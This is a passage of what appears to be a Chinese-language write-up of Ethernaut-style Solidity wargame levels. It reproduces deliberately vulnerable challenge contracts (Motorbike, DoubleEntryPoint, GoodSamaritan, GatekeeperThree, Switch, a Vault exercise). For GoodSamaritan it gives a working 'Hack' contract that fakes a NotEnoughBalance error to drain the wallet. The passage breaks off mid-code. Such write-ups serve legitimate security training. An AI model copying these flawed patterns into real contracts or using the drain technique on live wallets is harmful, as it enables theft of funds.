initialized&quot;);<br>        maxBalance = _maxBalance;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyWhitelisted &#123;<br>        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);<br>        _;<br>    &#125;<br><br>    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;<br>      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);<br>      maxBalance = _maxBalance;<br>    &#125;<br><br>    function addToWhitelist(address addr) external &#123;<br>        require(msg.sender == owner, &quot;Not the owner&quot;);<br>        whitelisted[addr] = true;<br>    &#125;<br><br>    function deposit() external payable onlyWhitelisted &#123;<br>      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);<br>      balances[msg.sender] += msg.value;<br>    &#125;<br><br>    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;<br>        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);<br>        balances[msg.sender] -= value;<br>        (bool success, ) = to.call&#123; value: value &#125;(data);<br>        require(success, &quot;Execution failed&quot;);<br>    &#125;<br><br>    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;<br>        bool depositCalled = false;<br>        for (uint256 i = 0; i &lt; data.length; i++) &#123;<br>            bytes memory _data = data[i];<br>            bytes4 selector;<br>            assembly &#123;<br>                selector := mload(add(_data, 32))<br>            &#125;<br>            if (selector == this.deposit.selector) &#123;<br>                require(!depositCalled, &quot;Deposit can only be called once&quot;);<br>                // Protect against reusing msg.value<br>                depositCalled = true;<br>            &#125;<br>            (bool success, ) = address(this).delegatecall(data[i]);<br>            require(success, &quot;Error while delegating call&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h1><p>任务要求：</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// SPDX-License-Identifier: MIT<br><br>pragma solidity &lt;0.7.0;<br><br>import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;<br>import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;<br><br>contract Motorbike &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br>    <br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br>    <br>    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.<br>    constructor(address _logic) public &#123;<br>        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);<br>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;<br>        (bool success,) = _logic.delegatecall(<br>            abi.encodeWithSignature(&quot;initialize()&quot;)<br>        );<br>        require(success, &quot;Call failed&quot;);<br>    &#125;<br><br>    // Delegates the current call to `implementation`.<br>    function _delegate(address implementation) internal virtual &#123;<br>        // solhint-disable-next-line no-inline-assembly<br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize())<br>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)<br>            returndatacopy(0, 0, returndatasize())<br>            switch result<br>            case 0 &#123; revert(0, returndatasize()) &#125;<br>            default &#123; return(0, returndatasize()) &#125;<br>        &#125;<br>    &#125;<br><br>    // Fallback function that delegates calls to the address returned by `_implementation()`. <br>    // Will run if no other function in the contract matches the call data<br>    fallback () external payable virtual &#123;<br>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);<br>    &#125;<br><br>    // Returns an `AddressSlot` with member `value` located at `slot`.<br>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;<br>        assembly &#123;<br>            r_slot := slot<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Engine is Initializable &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    address public upgrader;<br>    uint256 public horsePower;<br><br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br><br>    function initialize() external initializer &#123;<br>        horsePower = 1000;<br>        upgrader = msg.sender;<br>    &#125;<br><br>    // Upgrade the implementation of the proxy to `newImplementation`<br>    // subsequently execute the function call<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;<br>        _authorizeUpgrade();<br>        _upgradeToAndCall(newImplementation, data);<br>    &#125;<br><br>    // Restrict to upgrader role<br>    function _authorizeUpgrade() internal view &#123;<br>        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);<br>    &#125;<br><br>    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data<br>    ) internal &#123;<br>        // Initial upgrade and setup call<br>        _setImplementation(newImplementation);<br>        if (data.length &gt; 0) &#123;<br>            (bool success,) = newImplementation.delegatecall(data);<br>            require(success, &quot;Call failed&quot;);<br>        &#125;<br>    &#125;<br>    <br>    // Stores a new address in the EIP1967 implementation slot.<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        <br>        AddressSlot storage r;<br>        assembly &#123;<br>            r_slot := _IMPLEMENTATION_SLOT<br>        &#125;<br>        r.value = newImplementation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h1><p>任务要求：</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br><br>interface DelegateERC20 &#123;<br>  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);<br>&#125;<br><br>interface IDetectionBot &#123;<br>    function handleTransaction(address user, bytes calldata msgData) external;<br>&#125;<br><br>interface IForta &#123;<br>    function setDetectionBot(address detectionBotAddress) external;<br>    function notify(address user, bytes calldata msgData) external;<br>    function raiseAlert(address user) external;<br>&#125;<br><br>contract Forta is IForta &#123;<br>  mapping(address =&gt; IDetectionBot) public usersDetectionBots;<br>  mapping(address =&gt; uint256) public botRaisedAlerts;<br><br>  function setDetectionBot(address detectionBotAddress) external override &#123;<br>      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);<br>  &#125;<br><br>  function notify(address user, bytes calldata msgData) external override &#123;<br>    if(address(usersDetectionBots[user]) == address(0)) return;<br>    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;<br>        return;<br>    &#125; catch &#123;&#125;<br>  &#125;<br><br>  function raiseAlert(address user) external override &#123;<br>      if(address(usersDetectionBots[user]) != msg.sender) return;<br>      botRaisedAlerts[msg.sender] += 1;<br>  &#125; <br>&#125;<br><br>contract CryptoVault &#123;<br>    address public sweptTokensRecipient;<br>    IERC20 public underlying;<br><br>    constructor(address recipient) &#123;<br>        sweptTokensRecipient = recipient;<br>    &#125;<br><br>    function setUnderlying(address latestToken) public &#123;<br>        require(address(underlying) == address(0), &quot;Already set&quot;);<br>        underlying = IERC20(latestToken);<br>    &#125;<br><br>    /*<br>    ...<br>    */<br><br>    function sweepToken(IERC20 token) public &#123;<br>        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);<br>        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));<br>    &#125;<br>&#125;<br><br>contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;<br>    DelegateERC20 public delegate;<br><br>    function mint(address to, uint256 amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;<br>        delegate = newContract;<br>    &#125;<br><br>    function transfer(address to, uint256 value) public override returns (bool) &#123;<br>        if (address(delegate) == address(0)) &#123;<br>            return super.transfer(to, value);<br>        &#125; else &#123;<br>            return delegate.delegateTransfer(to, value, msg.sender);<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;<br>    address public cryptoVault;<br>    address public player;<br>    address public delegatedFrom;<br>    Forta public forta;<br><br>    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;<br>        delegatedFrom = legacyToken;<br>        forta = Forta(fortaAddress);<br>        player = playerAddress;<br>        cryptoVault = vaultAddress;<br>        _mint(cryptoVault, 100 ether);<br>    &#125;<br><br>    modifier onlyDelegateFrom() &#123;<br>        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);<br>        _;<br>    &#125;<br><br>    modifier fortaNotify() &#123;<br>        address detectionBot = address(forta.usersDetectionBots(player));<br><br>        // Cache old number of bot alerts<br>        uint256 previousValue = forta.botRaisedAlerts(detectionBot);<br><br>        // Notify Forta<br>        forta.notify(player, msg.data);<br><br>        // Continue execution<br>        _;<br><br>        // Check if alarms have been raised<br>        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);<br>    &#125;<br><br>    function delegateTransfer(<br>        address to,<br>        uint256 value,<br>        address origSender<br>    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;<br>        _transfer(origSender, to, value);<br>        return true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="GoodSamaritan"><a href="#GoodSamaritan" class="headerlink" title="GoodSamaritan"></a>GoodSamaritan</h1><p>任务要求：拿走所有的钱。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity &gt;=0.8.0 &lt;0.9.0;<br><br>import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;<br><br>contract GoodSamaritan &#123;<br>    Wallet public wallet;<br>    Coin public coin;<br><br>    constructor() &#123;<br>        wallet = new Wallet();<br>        coin = new Coin(address(wallet));<br><br>        wallet.setCoin(coin);<br>    &#125;<br><br>    function requestDonation() external returns(bool enoughBalance)&#123;<br>        // donate 10 coins to requester<br>        try wallet.donate10(msg.sender) &#123;<br>            return true;<br>        &#125; catch (bytes memory err) &#123;<br>            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;<br>                // send the coins left<br>                wallet.transferRemainder(msg.sender);<br>                return false;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Coin &#123;<br>    using Address for address;<br><br>    mapping(address =&gt; uint256) public balances;<br><br>    error InsufficientBalance(uint256 current, uint256 required);<br><br>    constructor(address wallet_) &#123;<br>        // one million coins for Good Samaritan initially<br>        balances[wallet_] = 10**6;<br>    &#125;<br><br>    function transfer(address dest_, uint256 amount_) external &#123;<br>        uint256 currentBalance = balances[msg.sender];<br><br>        // transfer only occurs if balance is enough<br>        if(amount_ &lt;= currentBalance) &#123;<br>            balances[msg.sender] -= amount_;<br>            balances[dest_] += amount_;<br><br>            if(dest_.isContract()) &#123;<br>                // notify contract <br>                INotifyable(dest_).notify(amount_);<br>            &#125;<br>        &#125; else &#123;<br>            revert InsufficientBalance(currentBalance, amount_);<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Wallet &#123;<br>    // The owner of the wallet instance<br>    address public owner;<br><br>    Coin public coin;<br><br>    error OnlyOwner();<br>    error NotEnoughBalance();<br><br>    modifier onlyOwner() &#123;<br>        if(msg.sender != owner) &#123;<br>            revert OnlyOwner();<br>        &#125;<br>        _;<br>    &#125;<br><br>    constructor() &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function donate10(address dest_) external onlyOwner &#123;<br>        // check balance left<br>        if (coin.balances(address(this)) &lt; 10) &#123;<br>            revert NotEnoughBalance();<br>        &#125; else &#123;<br>            // donate 10 coins<br>            coin.transfer(dest_, 10);<br>        &#125;<br>    &#125;<br><br>    function transferRemainder(address dest_) external onlyOwner &#123;<br>        // transfer balance left<br>        coin.transfer(dest_, coin.balances(address(this)));<br>    &#125;<br><br>    function setCoin(Coin coin_) external onlyOwner &#123;<br>        coin = coin_;<br>    &#125;<br>&#125;<br><br>interface INotifyable &#123;<br>    function notify(uint256 amount) external;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>先看GoodSamaritan合约，只有一个可调用方法requestDonation，以及在构造函数中创建了我们需要的Wallet和coin，这也限制了无法直接调用Wallet、coin中的方法。</p>
<p>接着看requestDonation方法，他会通过wallet进行捐赠10金额给msg.sender，那我们进入Wallet中，调用donate10函数会先查看coin中wallet是否还有10金额的余额，如果没有会抛出一个<code>NotEnoughBalance()</code>错误，否则才会调用coin的transfer进行转账，</p>
<p>接着又进入到coin中，transfer函数中<code>currentBalance = balances[msg.sender]</code>这一句代码也指示了我们需要通过wallet执行transfer，这样currentBalance才是我们的钱包余额。才能继续后面的操作：正常的余额增减，之后对我们传入的地址进行了一个是否是合约的判断：如果是将会转为<code>INotifyable</code>，调用notify函数；如果不是将会正常执行完交易，这就是整个requestDonation的流程，接着看catch的部分：</p>
<p>如果接受到前面<code>NotEnoughBalance()</code>的错误，将会执行wallet的transferRemainder，而这个函数能够把wallet所有的coin全部转走。</p>
<p>因此，我们要想一步转走这些余额，就必须通过transferRemainder来实现，也就是：通过一个合约，来正常调用requestDonation，然后在coin中进行transfer的时候，通过接口<code>INotifyable</code>的notify方法返回一个<code>NotEnoughBalance()</code>的错误，这样我们就由transferRemainder再一次进入coin的transfer中，而这一次我们就不需要返回错误，正常交易就行，因此对notify要求有条件性：当提款金额是10的时候抛出错误。这样就ok了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IGood &#123;<br>    function requestDonation() external returns(bool enoughBalance);<br>    function coin() external returns (address);<br>    function wallet() external returns (address);<br>&#125;<br><br>interface Icoin &#123;<br>  function balance() external returns (uint256);<br>&#125;<br><br>contract Hack &#123;<br>  error NotEnoughBalance();<br><br>  constructor(IGood target) &#123;<br>    target.requestDonation();<br>  &#125;<br><br>  function notify(uint256 amount) external &#123;<br>    if (amount == 10) &#123;<br>      revert NotEnoughBalance();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="GatekeeperThree"><a href="#GatekeeperThree" class="headerlink" title="GatekeeperThree"></a>GatekeeperThree</h1><p>任务要求：</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract SimpleTrick &#123;<br>  GatekeeperThree public target;<br>  address public trick;<br>  uint private password = block.timestamp;<br><br>  constructor (address payable _target) &#123;<br>    target = GatekeeperThree(_target);<br>  &#125;<br>    <br>  function checkPassword(uint _password) public returns (bool) &#123;<br>    if (_password == password) &#123;<br>      return true;<br>    &#125;<br>    password = block.timestamp;<br>    return false;<br>  &#125;<br>    <br>  function trickInit() public &#123;<br>    trick = address(this);<br>  &#125;<br>    <br>  function trickyTrick() public &#123;<br>    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;<br>      target.getAllowance(password);<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract GatekeeperThree &#123;<br>  address public owner;<br>  address public entrant;<br>  bool public allowEntrance;<br><br>  SimpleTrick public trick;<br><br>  function construct0r() public &#123;<br>      owner = msg.sender;<br>  &#125;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender == owner);<br>    require(tx.origin != owner);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(allowEntrance == true);<br>    _;<br>  &#125;<br><br>  modifier gateThree() &#123;<br>    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;<br>      _;<br>    &#125;<br>  &#125;<br><br>  function getAllowance(uint _password) public &#123;<br>    if (trick.checkPassword(_password)) &#123;<br>        allowEntrance = true;<br>    &#125;<br>  &#125;<br><br>  function createTrick() public &#123;<br>    trick = new SimpleTrick(payable(address(this)));<br>    trick.trickInit();<br>  &#125;<br><br>  function enter() public gateOne gateTwo gateThree &#123;<br>    entrant = tx.origin;<br>  &#125;<br><br>  receive () external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h1><p>任务要求：</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Switch &#123;<br>    bool public switchOn; // switch is off<br>    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;));<br><br>     modifier onlyThis() &#123;<br>        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);<br>        _;<br>    &#125;<br><br>    modifier onlyOff() &#123;<br>        // we use a complex data type to put in memory<br>        bytes32[1] memory selector;<br>        // check that the calldata at position 68 (location of _data)<br>        assembly &#123;<br>            calldatacopy(selector, 68, 4) // grab function selector from calldata<br>        &#125;<br>        require(<br>            selector[0] == offSelector,<br>            &quot;Can only call the turnOffSwitch function&quot;<br>        );<br>        _;<br>    &#125;<br><br>    function flipSwitch(bytes memory _data) public onlyOff &#123;<br>        (bool success, ) = address(this).call(_data);<br>        require(success, &quot;call failed :(&quot;);<br>    &#125;<br><br>    function turnSwitchOn() public onlyThis &#123;<br>        switchOn = true;<br>    &#125;<br><br>    function turnSwitchOff() public onlyThis &#123;<br>        switchOn = false;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>题1<br>pragma solidity 0.8.0;</p>
<p>contract Vault {<br>    mapping(address &#x3D;&gt; uint256) public balances;<br>    bool public flag &#x3D; false;</p>
<pre><code>constructor() payable&#123;
    require(msg.value == 100);
&#125;

function deposit() external payable &#123;
    balances[msg.sender] += msg.value;
&#125;

function withdraw(uint256 _amount) external payable &#123;
    (bool success, ) = payable (msg.sender).call&#123;value: _amount&#125;(&quot;&quot;);
    require(success, &quot;[OK]&quot;);

    balances[msg.sender] -= _amount;
&#125;

function solve(uint256 _number) public &#123;
    require(address(this).balance == 0, &quot;address(this) balance not 0&quot;);
    require(_number % 3 == 2, &quot;stage01&quot;);
    require(_number % 5 == 4, &quot;stage02&quot;);
    require(_number % 7 == 3, &quot;stage03&quot;);
    flag = true;
&#125;

function balanceOf(address _addr) external view returns(uint256) &#123;
    return balances[_addr];
&#125;

function canWithdraw(address _user, uint256 _amount) external view returns(bool) &#123;
    return balances[_user] &gt;= _amount;
&#125;

function isSolved() public view returns(bool) &#123;
    return flag == true;
&#125;
</code></pre>
<p>}</p>
<p>contract Hack {<br>    Vault target;</p>
<pre><code>constructor(address _tar) &#123;
